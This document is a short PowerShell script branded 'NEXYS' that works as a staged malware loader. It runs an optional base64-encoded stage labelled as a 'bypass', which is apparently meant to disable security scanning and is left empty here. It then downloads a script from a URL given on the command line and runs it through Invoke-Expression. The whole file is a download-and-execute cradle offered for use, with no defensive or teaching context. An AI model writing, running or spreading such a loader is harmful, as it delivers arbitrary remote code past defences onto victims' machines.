param(
    [string]$u
)
if (-not $u) {
    Write-Host "Usage: name.ps1 -u <URL>"
    exit
}
Write-Host "
    )            )       )   (                   
 ( /(         ( /(    ( /(   )\ )                
 )\())  (     )\())   )\()) (()/(                
((_)\   )\   ((_)\   ((_)\   /(_))               
 _((_) ((_)  __((_) __ ((_) (_))                 
| \| | | __| \ \/ / \ \ / / / __|                
| .` | | _|   >  <   \ V /  \__ \                
| |\_| |___| /_/\_\   |_|   |___/                 
"
Write-Host "`nNEXYS: STAGE[0]_INITIALIZATION_COMPLETE"
$base64String = ""
if (-not [string]::IsNullOrEmpty($base64String)) {
    try {
        $decodedString = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64String))
        Invoke-Expression $decodedString
        Write-Host "NEXYS: STAGE[1]_BYPASS_COMPLETE"
        Start-Sleep -Milliseconds 500
    } catch {
        Write-Host "ERRORS???"
    }
} else {
    Write-Host "NEXYS: STAGE[1]_FAILURE"
}
try {
    $remoteScript = Invoke-RestMethod -Uri $u
    Invoke-Expression $remoteScript
    Start-Sleep -Milliseconds 500
    Write-Host "NEXYS: STAGE[2]_REMOTE_EXEC_COMPLETE"
    Start-Sleep -Milliseconds 500
} catch {
    Write-Host "NEXYS: STAGE[2]_FAILURE"
}